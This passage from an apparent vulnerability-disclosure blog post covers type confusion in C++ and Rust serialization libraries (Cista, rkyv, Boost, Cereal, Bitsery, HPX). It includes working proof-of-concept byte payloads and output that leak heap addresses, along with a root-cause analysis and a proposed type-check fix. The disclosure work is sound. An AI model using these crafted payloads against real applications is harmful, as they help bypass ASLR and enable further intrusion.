        std::cout << "pa: " << data.pa->x << std::endl;
    }

    std::cout << "out:\n";
    printBuffer(buf);

    // Assume we read bytes from some untrusted source.
    // This modifies the pointer pa so that it points to itself and leaks its own address.
    // Instead of pointing to 0xffff'ffff'ffff'fff8, we point to 0x00 -> i.e. offset=0.
    buf = std::vector<unsigned char>{
        0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };

    std::cout << "in:\n";
    printBuffer(buf);

    auto deserialized = cista::deserialize<A, cista::mode::DEEP_CHECK>(buf);
    if (!deserialized) {
        std::cout << "failed to deserialize\n";
        return 1;
    }
    
    std::cout << "in (after deserialization):\n";
    printBuffer(buf);
    
    std::cout << "a: " << deserialized->a.x << std::endl;
    std::cout << "pa: " << "0x" << std::hex << deserialized->pa->x << std::endl;
}
```

Output:

```sh {data-output=2-100}
./a.out
a: 42
pa: 42
out:
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0xf8,0xff,0xff,0xff,0xff,0xff,0xff,0xff, 
in:
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 
in (after deserialization):
0x2a,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x18,0x37,0xee,0x7b,0x88,0x55,0x00,0x00, 
a: 42
pa: 0x55887bee3718
```

{% enddetails %}

{% details "Is this really a vulnerability in the library? Who bears the burden of fixing?" %}
I'm aware this discussion may arise, and I've somewhat had this discussion with the maintainer, to little effect. But mostly I'm writing this section to quell some of my own doubts and articulate my view. Here's the thing...

Suppose you're a **library user**, happily downloading and using Cista for your next project. You write some dumb app using GPT and ensure all the secure configurations are enabled. For instance, you use Cista's `DEEP_CHECKS` template option when deserializing, which ensures that pointers are not out-of-bounds, and there are no potential cyclical traps which may lead to DoS.

The library's documentation reassures you that [it is safe to deserialize untrusted input](https://github.com/felixguendling/cista/wiki/Security). So you build your dumb app and expose it to the wild forces of the internet.

Some time later, some dumb black hat throws a bunch of bytes at your dumb app and hacks it. Turns out, the hacker replaced `0xf8,0xff,0xff,0xff,0xff,0xff,0xff,0xff` with `0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00`. When those bytes were deserialized, the library returned a value, a heap address, which your application code trusted to be application data. As your code chugged along, it inadvertently exposed that heap address, reducing entropy for the attacker and allowing them to bypass ASLR, which then allowed the hacker to pull off other fancy attacks affecting some other component.

What does this mean for the library user? That they can't trust Cista's deserialized output? That they need to perform their own checks?

No. A serialization library which claims to be safe against untrusted input should draw clear boundaries and provide data the user can *reasonably* trust. A serialization library definitely should **not** confuse an internal address (or other metadata) for user data. And it certainly should **not** weaken the security posture of the application by mixing application data and pointers.

If a field was some bounded integer (e.g. limited to 0 to 5), then a bounds check should be performed by the *library user*. If not, they expose themselves to integer overflow or negative indexing bugs and the burden is on them.^[This could potentially be solved by the library providing a BoundedInteger type which will perform runtime checks upon deserialization.]

But not all integer fields are bounded. Think: ID numbers, a counter, a length, bitwise flags. In these cases, the burden is on the *library code* as the library user truly has no control. Who's to say `93825987759584` (`0x555590abcde0`) isn't someone's real ID or phone number?

Admittedly, this issue is not as severe or impactful as the previous two. Still a vuln/weakness nonetheless.
{% enddetails %}

### 4. Bonus: Type Confusion Leading to Address Leak in rkyv `unsafe` API

rkyv (pronounced *archive*, ar-kive) is a Rust zero-copy deserialization library featuring the serialization of shared pointers (`std::rc::Rc`). It is possible to achieve type confusion in rkyv, similar to the one found in Cista.

The reason for presenting this section is twofold: to demonstrate that such type confusion attacks are not limited to C++ but are feasible in other languages, and to demonstrate that the attack surface isn't solely limited to the library. Just because a library offers a secure configuration does not mean research has hit a dead end. What if some devs obliviously disabled this secure configuration while accepting *untrusted* input? There is the potential for downstream applications to be “misconfigured”.^[Relevant to this discussion is: How do we define trust? What about attack payloads delivered locally over the filesystem? Food for thought.]

It should be noted that rkyv has a secure configuration (the default safe API) to mitigate this potential vulnerability. The library also provides an unsafe API, presumably for developers who want to opt for speed. The burden is on the library user to decide between security and performance.

Alright, enough yapping. Let's demonstrate a scenario where a library user "misconfigures" rkyv.

To call the vulnerable API, we need to use Rust's `unsafe {}` wrapper. In the following example, we will deserialize shared pointers to a `String` and `(u64, u64)` (pair of 64-bit unsigned integers). Again, we assume the deserialized result is observable by the attacker. The goal is to leak the `String`'s internal buffer address.

```rust
struct Data {
    s: Rc<String>,
    a: Rc<(u64, u64)>,
    b: Rc<(u64, u64)>,
}

// Attacker sends these bytes...
let bytes: AlignedVec = bytes_to_aligned_vec(&[
    /* 00 */ 104, 101, 108, 108, 111, 0, 0, 5, // s.data ("hello")
    /* 08 */ 42, 0, 0, 0, 0, 0, 0, 0, // a.data.0
    /* 10 */ 43, 0, 0, 0, 0, 0, 0, 0, // a.data.1
    /* 18 */ 232, 255, 255, 255, // s, offset=-24 -> addr=00
    /* 1c */ 236, 255, 255, 255, // a, offset=-20 -> addr=08
    /* 20 */ 224, 255, 255, 255, // b, offset=-32 -> addr=00
]);

// Deserialized with unsafe API...
let archived = unsafe { rkyv::archived_root::<Data>(&bytes[..]) };
let deserialized: Data = archived.deserialize(&mut SharedDeserializeMap::new()).unwrap();
println!("type confusion: {:#x?}", &*deserialized.b);
```

Running this, we observe an address leak:

```text
type confusion: (0x5, 0x55aecbf81e30)
```

Rust, on x86 Linux, represents a `String` with the size in the first 8 bytes followed by the address. Here, we see the size is 5 (corresponding to the string `hello`) and the leaked heap address is `0x55aecbf81e30`.

{% image "assets/deserialization_diagram_address_leak_primitive_rust.png", "jw-60 alpha-imgv", "" %}

{% details "Full Code" %}
Tested on version 0.7.45 of rkyv.

```rust {data-label=main.rs}
use rkyv::{Archive, Deserialize, Serialize, to_bytes,
    de::deserializers::SharedDeserializeMap,
    util::AlignedVec
};
use std::rc::Rc;

#[derive(Debug, Eq, PartialEq, Archive, Deserialize, Serialize)]
#[archive(
    compare(PartialEq),
    check_bytes,
)]
#[archive_attr(derive(Debug))]
struct Data {
    s: Rc<String>,
    a: Rc<(u64, u64)>,
    b: Rc<(u64, u64)>,
}

fn main() {
    let shared_value = Rc::new((42, 43));
    let data = Data {
        s: Rc::new("hello".to_string()),
        a: shared_value.clone(),
        b: shared_value.clone(),
    };

    let bytes = to_bytes::<_, 256>(&data).unwrap();
    println!("out: {:?}", bytes);

    // Now suppose the bytes are read from some untrusted source...

    fn bytes_to_aligned_vec(bytes: &[u8]) -> AlignedVec {
        let mut aligned_vec = AlignedVec::new();
        aligned_vec.extend_from_slice(bytes);
        aligned_vec
    }

    let bytes: AlignedVec = bytes_to_aligned_vec(&[
        /* 00 */ 104, 101, 108, 108, 111, 0, 0, 5, // s.data ("hello")
        /* 08 */ 42, 0, 0, 0, 0, 0, 0, 0, // a.data.0
        /* 10 */ 43, 0, 0, 0, 0, 0, 0, 0, // a.data.1
        /* 18 */ 232, 255, 255, 255, // s, offset=-24 -> addr=00
        /* 1c */ 236, 255, 255, 255, // a, offset=-20 -> addr=08
        /* 20 */ 224, 255, 255, 255, // b, offset=-32 -> addr=00
        // 
        // original out:
        // 104, 101, 108, 108, 111, 0, 0, 5,
        // 42, 0, 0, 0, 0, 0, 0, 0, 43, 0, 0, 0, 0, 0, 0, 0,
        // 232, 255, 255, 255,
        // 236, 255, 255, 255,
        // 232, 255, 255, 255,
    ]);
    println!("in: {:?}", bytes);

    let archived = unsafe { rkyv::archived_root::<Data>(&bytes[..]) };
    let deserialized: Data = archived.deserialize(&mut SharedDeserializeMap::new()).unwrap();

    println!("type confusion: {:#x?}", &*deserialized.b);
    println!("s: {:p}", Rc::into_raw(deserialized.s));
    println!("a: {:p}", Rc::into_raw(deserialized.a));
    println!("b: {:p}", Rc::into_raw(deserialized.b));
}
```

Sample Output:
```text
out: [104, 101, 108, 108, 111, 0, 0, 5, 42, 0, 0, 0, 0, 0, 0, 0, 43, 0, 0, 0, 0, 0, 0, 0, 232, 255, 255, 255, 236, 255, 255, 255, 232, 255, 255, 255]
in: [104, 101, 108, 108, 111, 0, 0, 5, 42, 0, 0, 0, 0, 0, 0, 0, 43, 0, 0, 0, 0, 0, 0, 0, 232, 255, 255, 255, 236, 255, 255, 255, 224, 255, 255, 255]
type confusion: (
    0x5,
    0x55aecbf81e30,
)
s: 0x55aecbf81f80
a: 0x55aecbf81fd0
b: 0x55aecbf81f80
```

Cargo.toml:
```toml
[package]
name = "rkyv_shared_example"
version = "0.1.0"
edition = "2021"

[dependencies]
rkyv = { version = "0.7", features = ["alloc", "validation"] }
```

{% enddetails %}

## Root Cause Analysis

Earlier, I posed the question "What is a mechanism to exploit?", to which our answer was *serialization of references*. Under the hood, this often boils down to a simple shallow copy (aka a pointer copy, `new_ptr = old_ptr`) which skips further deserialization. In general terms, it can be expressed with the following pseudocode:

```cpp
template<class T>
void load_pointer(T*& new_ptr, int id) {
    if (is_invalid_id(id) || id_to_obj_lookup[id] == nullptr) {
        load_and_deserialize_object<T>(new_ptr);
        id_to_obj_lookup[id] = new_ptr;
    } else {
        @@new_ptr = id_to_obj_lookup[id];@@ // Shallow copy shortcut.
    }
}
```

But the shallow copy isn't the issue. It's the fact that this shortcutting step **does not check the current type being deserialized**.

{% details "Shallow Copy Shortcutting Mechanism: The Gory Details" %}

Each library has their own codepath and implementation. In the snippets below, pay attention to the absence of type checks prior to the shallow copy.

Boost Serialization:
- If tracking is enabled and the object was found, then `track()` copies the raw address and `load_pointer()` **returns early**.
- Steps:
    1. Shallow Copy: [`basic_iarchive_impl::track#L360-364`](https://github.com/boostorg/serialization/blob/boost-1.89.0/src/basic_iarchive.cpp#L360-L364)
        ```cpp
        if(object_id_type(object_id_vector.size()) > oid){
            // we're done
            @@t = object_id_vector[oid].address;@@
            return false;
        }
        ```
    2. Early Return: [`basic_iarchive_impl::load_pointer#L476-478`](https://github.com/boostorg/serialization/blob/boost-1.89.0/src/basic_iarchive.cpp#L476-L478)
        ```cpp
        const bool tracking = co.tracking_level;
        // if we're tracking and the pointer has already been read
        if(tracking && ! track(ar, t))
            // we're done
            return bpis_ptr;
        ```

Cereal:
- If the `id` does not have the special `2 << 30` flag, then a previous ID is looked up and copied.
- Steps:
    1. Lookup: [`InputArchive::getSharedPointer#L793-802`](https://github.com/USCiLab/cereal/blob/v1.3.2/include/cereal/cereal.hpp#L793-L802)
        ```cpp
        inline std::shared_ptr<void> getSharedPointer(std::uint32_t const id)
        {
            if(id == 0) return std::shared_ptr<void>(nullptr);
            
            auto iter = itsSharedPointerMap.find( id );
            if(iter == itsSharedPointerMap.end())
                throw Exception("Error while trying to deserialize a smart pointer. Could not find id " + std::to_string(id));
            
            return iter->second;
        }
        ```
    2. Shallow Copy: [`CEREAL_LOAD_FUNCTION_NAME(Archive&, PtrWrapper<std::shared_ptr<T>&>&) #L341`](https://github.com/USCiLab/cereal/blob/v1.3.2/include/cereal/types/memory.hpp#L341)
        ```cpp
        if( id & detail::msb_32bit )
        {
          // New ID detected: deserialize and register new ID.
        }
        else // Shortcut
          @@wrapper.ptr = std::static_pointer_cast<T>(ar.getSharedPointer(id));@@
        ```

Bitsery:
- Bitsery will lookup an entry in `_idMap`. For `SharedOwner` ownership, it will first create and register a `sharedState` object, which is later assigned to every instance with the same `id`.
- Steps:
    1. Lookup/Register: [`PointerObjectExtensionBase::deserialize#L384-391`](https://github.com/fraillt/bitsery/blob/v5.2.4/include/bitsery/ext/utils/pointer_utils.h#L384-L391)
    2. Shortcutting: [`PointerObjectExtensionBase::deserializeImpl(..., OwnershipType<PointerOwnershipType::SharedOwner>) #L557`](https://github.com/fraillt/bitsery/blob/v5.2.4/include/bitsery/ext/utils/pointer_utils.h#L557)
        ```cpp
        if (!ptrInfo.sharedState) {
            // First encounter, create the sharedState...
            // This path is avoided when the `id` is subsequently encountered.
        }
        // Shortcutting...
        TPtrManager<T>::loadFromSharedState(getSharedStateObj<T>(ptrInfo), obj);
        ```
    3. Shallow Copy: [`SmartPtrOwnerManager::loadFromSharedState#L205`](https://github.com/fraillt/bitsery/blob/v5.2.4/include/bitsery/ext/std_smart_ptr.h#L205)
        ```cpp
        static void loadFromSharedState(TSharedState& state, @@T&@@ obj)
        {
            // ...
            @@obj = std::shared_ptr<TElement>(state.obj, p);@@
        }
        ```

HPX:
- Despite having a different format, HPX follows a similar lookup-shortcut pattern.
- Steps:
    1. Lookup: [`tracked_pointer#L56-64`](https://github.com/STEllAR-GROUP/hpx/blob/v1.11.0/libs/core/serialization/src/detail/pointer.cpp#L56-L64)
    2. Shortcutting: [`serialize_pointer_tracked#L282`](https://github.com/STEllAR-GROUP/hpx/blob/v1.11.0/libs/core/serialization/include/hpx/serialization/detail/pointer.hpp#L282)
        ```cpp
        if (pos == static_cast<std::uint64_t>(-1))
        {
            // First encounter, load and store...
        }
        else
        {
            // Subsequent encounters, shortcut and shallow copy...
            @@ptr = helper.t_;@@
        }
        ```

{% enddetails %}

To remediate, one idea is to use a hashmap `map<intptr_t, typehash>` mapping a raw pointer address to a type ID/hash. On the first encounter, the object is deserialized and the pointer-typeID pair is inserted into the map. On subsequent encounters, the library checks whether the type hash of the stored object equals the type hash of the current deserialized object. Only then is the shallow copy executed.

Patching our pseudocode example:

```cpp {data-diff}
template<class T>
void load_pointer(T*& new_ptr, int id) {
    if (is_invalid_id(id) || id_to_obj_lookup[id] == nullptr) {
        load_and_deserialize_object<T>(new_ptr);
        id_to_obj_lookup[id] = new_ptr;
// +++++
        // T refers to the current type we’re attempting to deserialize.
        id_to_type_hashmap[id] = typehash<T>();
// =====
    } else {
// +++++
        // On subsequent checks, T could be a different type.
        if (id_to_type_hashmap[id] != typehash<T>())
            throw bad_type_error{};
// =====
        new_ptr = id_to_obj_lookup[id]; // Shallow copy shortcut.
    }
}
```

What about polymorphism? This is a feature implemented in some libraries in this study. To handle polymorphism, we need to redefine (overload) type-equality for polymorphic classes. Instead of checking `A == B`, we want two classes `A` and `B` to be equal if either `A > B` (`B` is a subtype / derived class of `A`) or vice versa. This means we would need to traverse the inheritance chain.

Root cause analysis of Ownership Confusion in Boost Serialization and of Type Confusion in Cista have been left as an exercise for the reader.

## Concluding Notes

### On Vulnerability Scoring

{# TODO: review the score! #}
While these CVEs are scored a “critical” 9.8/10, this score assumes a *reasonable "worst-case" scenario* as warranted by the [CVSS guidelines](https://www.first.org/cvss/v3-1/user-guide#:~:text=3.7.-,Scoring%20Vulnerabilities%20in%20Software%20Libraries) [and](https://www.first.org/cvss/v3-1/examples#:~:text=worst%2Dcase%20scenario%20is%20a%20network%20attack) [examples](https://www.first.org/cvss/v3-1/examples#:~:text=We%20assume%20the%20latter%20as%20it%20is%20the%20reasonable%20worst%20case) for *software libraries*. Notably, the scoring also [assumes reasonable conditions](https://www.first.org/cvss/v3-1/user-guide#:~:text=Assume%20Vulnerable%20Configurations) required for successful exploitation, such as the deserialization of two shared pointers and the observability of certain types.

If we were discussing risk, exploitability, and overall real world impact, I would say these vulnerabilities are not a critical 9.8. But the CVSS system does not measure systems this way. [CVSS measures severity, not risk](https://www.first.org/cvss/v3-1/user-guide#:~:text=CVSS%20Measures%20Severity). When applied to downstream libraries, applications, and deployments, the risk and severity should be analysed independently.

The point is, CVSS has its pros and cons. CVSS is a rubric, and rubrics are models to quantify the unquantifiable. All models are wrong, but some are useful.

### On Memory Safety and Rust

“Would Rust have fixed this?” — a certain infosec YouTuber

Perchance? Maybe? Not really?

To be fair, Rust does its part in eliminating integer overflow (a whole class of runtime bugs!) by encouraging checked arithmetic. But unlike checked arithmetic, the deserialization attack surface is much more varied and dynamic, with complex types and logic. Thus, to secure serialization of references, type checks need to be explicitly programmed by the library author.

rkyv, a Rust serialization library discussed earlier, exposes two APIs: an `unsafe` API prone to type confusion attacks, and— more notably— a safe API with extensive runtime type validation. If rkyv is deemed "more secure" against deserialization attacks, it would be thanks to its validation modules rather than Rust itself. Perhaps the case could be made that Rust fixes the issue by proxy of promoting a security-first mindset. But whether this is effectively executed (in general) depends on a developer's decisions.^[If people want performance, they'll prioritise performance. Someone (I forgot who and where) once said: Programming languages are built around communities and values. There is a sort of chicken-egg scenario where if the community values speed, then the language will aim to "satisfy that demand". On the flip side, it is more likely for those community members with strong values to be actively guiding the direction of the language (think: C++ standards committee or proposals). C++ has very much been driven by finance, games, big tech, and constrained systems (embedded/IoT/robotics), so it's understandable why performance is very much prioritised and security less so.]

### Further Research

Some ideas for further research:

- Relax or find alternative conditions for exploitation. Current conditions require deserialization of certain types (e.g. `shared_ptr`) to obtain primitives.
- Further research on potential impact in downstream software, of which there are two types:
    - Dependents of the affected libraries, exploiting the CVEs explained in this post.
    - Dependents of serialization libraries exploiting insecure configurations (e.g. cista/rkyv without validation). It is possible that library users have security configurations disabled, inadvertently opening the door to attacks. In such cases, this would be a vulnerability in the library users' code rather than in the library itself.
- Further research on similar attacks in other languages/libraries.

---

Stay frosty. Keep hacking.
